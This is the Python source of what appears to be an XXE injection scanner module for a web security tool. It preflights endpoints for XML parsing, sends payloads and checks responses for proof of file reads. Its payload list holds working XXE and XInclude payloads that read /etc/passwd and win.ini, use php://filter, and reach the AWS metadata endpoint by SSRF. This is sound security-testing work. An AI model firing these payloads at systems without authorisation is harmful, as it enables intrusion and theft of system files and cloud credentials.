"""
scanner/web/xxe.py
==================
XML External Entity (XXE) Injection Scanner.

Detection Approach
------------------
1. **Preflight** — Benign XML POST; endpoint must show XML/SOAP **Content-Type**,
   or a **strict** server-side XML parser error. JSON APIs and ambiguous pages
   that only echo ``<?xml`` are rejected (no loose HTML/XML echo as “context”).
2. **Proof-only** — File/metadata evidence must match structural rules (e.g.
   multiple ``/etc/passwd``-shaped lines) so raw payload reflection is rejected.
3. **Dedup** — Identical exploitation fingerprints are reported once per scan
   even if many URLs return the same mirrored content.

OWASP: A05:2021 - Security Misconfiguration  CWE-611
"""

from __future__ import annotations

import hashlib
import re
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

from ..scan_logger import logger

from .injection_scope import is_static_asset_url
from .injection_fp_guard import suppress_xxe_fp

# Well-formed probe (no external entities) to detect XML parsing on the server.
_BENIGN_XML_PROBE = b"""<?xml version="1.0" encoding="UTF-8"?>
<alanprobe xmlns="urn:alanscan:xxe-preflight">ok</alanprobe>"""

# ── XXE Payloads ──────────────────────────────────────────────────────────────
XXE_PAYLOADS = [
    (
        "Classic XXE (Linux /etc/passwd)",
        """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>""",
    ),
    (
        "Classic XXE (Windows win.ini)",
        """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>
<root><data>&xxe;</data></root>""",
    ),
    (
        "SSRF via XXE (AWS metadata)",
        """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><data>&xxe;</data></root>""",
    ),
    (
        "XXE via PHP filter (source disclosure)",
        """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root><data>&xxe;</data></root>""",
    ),
    (
        "Blind XXE (parameter entity)",
        """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]>
<root><data>test</data></root>""",
    ),
    (
        "XXE with UTF-16 encoding",
        """<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>""",
    ),
    (
        "XInclude Attack",
        """<root xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></root>""",
    ),
]

XML_CONTENT_TYPES = (
    "application/xml",
    "text/xml",
)

# Strict server-side XML signals (preflight on HTML pages).
_XML_STRICT_PARSER_MARKERS = (
    "saxparseexception",
    "xmlexception",
    "simplexmlelement",
    "domdocument::loadxml",
    "lxml.etree",
    "javax.xml.stream",
    "org.xml.sax",
    "xmlreaderexception",
    "system.xml.xml",
    "parseerror at",
    "xml_parse_error",
)

# Looser markers when Content-Type is already XML/SOAP.
_XML_LOOSE_MARKERS = (
    "<?xml",
    "soap:envelope",
    "soapenv:envelope",
    "soap:body",
    "xml parse error",
    "parsing xml",
    "malformed xml",
    "invalid xml",
    "not well-formed",
    "unexpected element",
    "unexpected end-tag",
    "premature end of document",
    "expected '</",
)

_PASSWD_LINE_RE = re.compile(
    r"^[a-z_][a-z0-9_-]*:[x*!]:\d+:\d+:.+$",
    re.I | re.M,
)


def _xxe_response_snippet(text: str | None, limit: int = 320) -> str:
    if not text:
        return ""
    t = text.replace("\r", " ").replace("\n", " ")
    return (t[:limit] + ("…" if len(t) > limit else "")).strip()


from ..base_scanner import BaseScanner
from .base_module import ScanContext


class XXEScanner(BaseScanner):
    """XML External Entity (XXE) injection scanner."""

    name = "xxe"

    def __init__(self, urls, threads=10, timeout=10, proxy=None, **kwargs):
        super().__init__(urls, threads=threads, timeout=timeout, proxy=proxy, **kwargs)
        self._xxe_dedup: set[tuple[str, str]] = set()
        self._xxe_dedup_lock = threading.Lock()

    def run(self, context: ScanContext) -> list[dict]:
        """Standard interface for controller execution."""
        self.urls = context.urls
        self.session = context.auth_session or context.session
        return self.scan()

    def scan(self):
        """Preflight XML context, then POST probes; dedup identical proof fingerprints."""
        findings: list[dict] = []
        self._xxe_dedup.clear()
        candidates = [u for u in self.urls if not is_static_asset_url(u)]
        if not candidates:
            logger.warning("  [!] No non-static URLs for XXE testing")
            return findings
        logger.info(
            "  [*] XXE: %s endpoint(s), XML preflight then %s payload kinds (POST, XML CT)",
            len(candidates),
            len(XXE_PAYLOADS),
        )
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futs = {ex.submit(self._test_url, u): u for u in candidates}
            for f in as_completed(futs):
                try:
                    findings.extend(f.result())
                except Exception:
                    pass
        return findings

    def _response_indicates_xml_context(self, resp) -> bool:
        """True when the server plausibly processes XML (reject JSON APIs and bare echoes)."""
        if resp is None:
            return False
        ct = (resp.headers.get("Content-Type") or "").lower()
        if resp.status_code == 415:
            return False
        if "json" in ct and "xml" not in ct:
            return False
        if "xml" in ct or "soap" in ct:
            return True
        b = (resp.text or "")[:48000]
        bl = b.lower()
        # HTML pages: only hard server-side parser errors (not reflected <?xml or SOAP keywords).
        if "html" in ct and "xml" not in ct:
            return any(m in bl for m in _XML_STRICT_PARSER_MARKERS)
        # Ambiguous or missing CT: strict markers only — avoids treating echoed probe XML as "context".
        return any(m in bl for m in _XML_STRICT_PARSER_MARKERS)

    def _preflight_xml_context(self, url: str) -> bool:
        """POST benign XML; require XML-handling context before any XXE payloads."""
        for content_type in XML_CONTENT_TYPES:
            try:
                resp = self.session.post(
                    url,
                    data=_BENIGN_XML_PROBE,
                    headers={"Content-Type": content_type},
                    timeout=self.timeout,
                    allow_redirects=False,
                )
                if self._response_indicates_xml_context(resp):
                    return True
            except Exception:
                continue
        return False

    @staticmethod
    def _passwd_proof_lines(body: str) -> list[str]:
        lines = []
        for ln in body.splitlines():
            s = ln.strip()
            if _PASSWD_LINE_RE.match(s):
                lines.append(s)
        return lines

    @staticmethod
    def _proof_fingerprint(body: str, proof_kind: str) -> str:
        """Stable hash of proof-bearing content (same mirror → same key)."""
        if proof_kind == "passwd":
            lines = XXEScanner._passwd_proof_lines(body)
            core = "\n".join(sorted(set(lines))[:24])
        elif proof_kind == "win_ini":
            low = body.lower()
            i = low.find("[fonts]")
            chunk = body[max(0, i - 120) : i + 800] if i >= 0 else body[:1200]
            core = chunk
        elif proof_kind == "imds":
            keys = []
            for ln in body.splitlines():
                t = ln.strip().lower()
                if t and len(t) < 80 and "\t" not in t and " " not in t:
                    keys.append(t)
            core = "\n".join(sorted(set(keys))[:40])
        elif proof_kind == "b64_passwd":
            low = body.lower()
            i = low.find("cm9vdDp4OjA6")
            chunk = body[max(0, i - 80) : i + 400] if i >= 0 else body[:800]
            core = chunk
        else:
            core = body[:4000]
        return hashlib.sha256(core.encode("utf-8", errors="replace")).hexdigest()

    @staticmethod
    def _looks_like_payload_reflection(body: str, proof_kind: str) -> bool:
        """True if evidence is probably echoed request, not resolved entity output."""
        low = body.lower()
        win = 400
        if proof_kind == "passwd":
            idx = low.find("root:x:0:0")
            if idx < 0:
                return True
            window = low[max(0, idx - win) : idx + 80]
            if "file:///" in window or "&xxe;" in window or "<!entity" in window:
                return True
            if "system \"" in window or 'system "' in window:
                return True
        if proof_kind == "win_ini":
            idx = low.find("[fonts]")
            if idx < 0:
                return True
            window = low[max(0, idx - win) : idx + len("[fonts]") + 200]
            if "c:/windows/win.ini" in window or (
                "win.ini" in window and "<!entity" in window
            ):
                return True
        if proof_kind == "imds":
            if "169.254.169.254" in low and len(body) < 600:
                return True
            if "http://169.254.169.254" in low and "ami-id" in low:
                near = low.find("ami-id")
                win2 = low[max(0, near - 300) : near + 200]
                if "169.254.169.254" in win2 and "latest/meta-data" in win2:
                    return True
        if proof_kind == "b64_passwd":
            idx = low.find("cm9vdDp4OjA6")
            if idx < 0:
                return True
            window = low[max(0, idx - win) : idx + 120]
            if "php://filter" in window or "<!entity" in window:
                return True
        return False

    @staticmethod
    def _proof_based_evidence(body: str) -> tuple[str, str] | None:
        """
        (evidence text, proof_kind) only for structural exploitation proof — not reflection.
        """
        if not body:
            return None
        low = body.lower()

        lines = XXEScanner._passwd_proof_lines(body)
        if len(lines) >= 2 and any("root:x:0:0" in ln.lower() for ln in lines):
            users = {ln.split(":", 1)[0].lower() for ln in lines if ":" in ln}
            if len(users) < 2:
                return None
            if XXEScanner._looks_like_payload_reflection(body, "passwd"):
                return None
            return (
                "Proof: multiple /etc/passwd-shaped lines including root — "
                "entity or XInclude resolved file content (not single-line echo).",
                "passwd",
            )

        if "[fonts]" in low:
            sections = re.findall(r"\[[^\]\r\n]+\]", body, flags=re.I)
            if len(sections) >= 2 and any("font" in s.lower() for s in sections):
                if XXEScanner._looks_like_payload_reflection(body, "win_ini"):
                    return None
                return (
                    "Proof: win.ini-style INI (multiple sections including [fonts]) — "
                    "Windows file read via XXE/XInclude likely.",
                    "win_ini",
                )

        if "ami-id" in low and (
            "instance-id" in low
            or "public-ipv4" in low
            or "local-ipv4" in low
            or "hostname" in low
        ):
            if XXEScanner._looks_like_payload_reflection(body, "imds"):
                return None
            return (
                "Proof: cloud IMDS-style fields (ami-id + instance/network) — "
                "SSRF via XXE likely.",
                "imds",
            )

        if "cm9vdDp4OjA6" in low:
            if XXEScanner._looks_like_payload_reflection(body, "b64_passwd"):
                return None
            return (
                "Proof: base64 segment matching /etc/passwd prefix (root:x:0:) — "
                "php://filter or similar read likely.",
                "b64_passwd",
            )

        return None

    def _test_url(self, url):
        results = []
        if not self._preflight_xml_context(url):
            logger.info(
                "  [i] XXE skipped — non-XML endpoint (no XML context after benign probe): %s",
                url,
            )
            return results

        for label, payload in XXE_PAYLOADS:
            for content_type in XML_CONTENT_TYPES:
                try:
                    resp = self.session.post(
                        url,
                        data=payload.encode("utf-8"),
                        headers={"Content-Type": content_type},
                        timeout=self.timeout,
                        allow_redirects=False,
                    )
                    proved = self._proof_based_evidence(resp.text)
                    if not proved:
                        continue
                    evidence, proof_kind = proved
                    if suppress_xxe_fp(resp.text):
                        logger.info(
                            "  [i] XXE suppressed — secure XML parser / entity policy: %s [%s]",
                            url,
                            label,
                        )
                        continue
                    fp = self._proof_fingerprint(resp.text, proof_kind)
                    with self._xxe_dedup_lock:
                        dedup_key = (proof_kind, fp)
                        if dedup_key in self._xxe_dedup:
                            logger.info(
                                "  [i] XXE deduped — identical exploitation evidence already reported: %s [%s]",
                                url,
                                label,
                            )
                            continue
                        self._xxe_dedup.add(dedup_key)
                    results.append(
                        {
                            "type": f"XXE Injection - {label}",
                            "url": url,
                            "parameter": f"XML body ({content_type})",
                            "payload": payload[:120] + "...",
                            "severity": "CRITICAL",
                            "evidence": evidence,
                            "extra": {"xxe_proof_kind": proof_kind, "xxe_proof_fingerprint": fp[:16]},
                        },
                    )
                    logger.info(
                        "XXE — payload + response snippet (structural proof)",
                        extra={
                            "kind": "INJECTION_PROOF",
                            "technique": "XXE",
                            "url": url,
                            "parameter": label,
                            "payload": payload[:800],
                            "response_snippet": _xxe_response_snippet(resp.text),
                            "xxe_proof_kind": proof_kind,
                        },
                    )
                    logger.warning("  [CRITICAL] XXE -> %s [%s]", url, label)
                except Exception:
                    continue
        return results
